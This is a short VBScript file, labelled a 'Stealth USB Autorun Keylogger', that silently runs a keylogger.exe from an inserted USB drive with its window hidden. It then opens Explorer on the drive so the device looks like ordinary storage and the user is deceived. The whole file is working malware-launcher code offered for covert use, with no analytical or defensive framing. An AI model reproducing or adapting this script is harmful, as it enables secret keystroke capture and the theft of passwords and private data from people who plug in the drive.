' Stealth USB Autorun Keylogger
' This VBS script runs silently when USB is inserted

Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get the USB drive path
strDrive = Left(WScript.ScriptFullName, 2)
strKeyloggerPath = strDrive & "\keylogger.exe"

' Check if keylogger exists and run it silently
If FSO.FileExists(strKeyloggerPath) Then
    ' Run keylogger silently without any windows
    WshShell.Run strKeyloggerPath, 0, False
End If

' Optional: Create a fake USB storage dialog to make it look legitimate
WshShell.Run "explorer.exe " & strDrive, 1, False 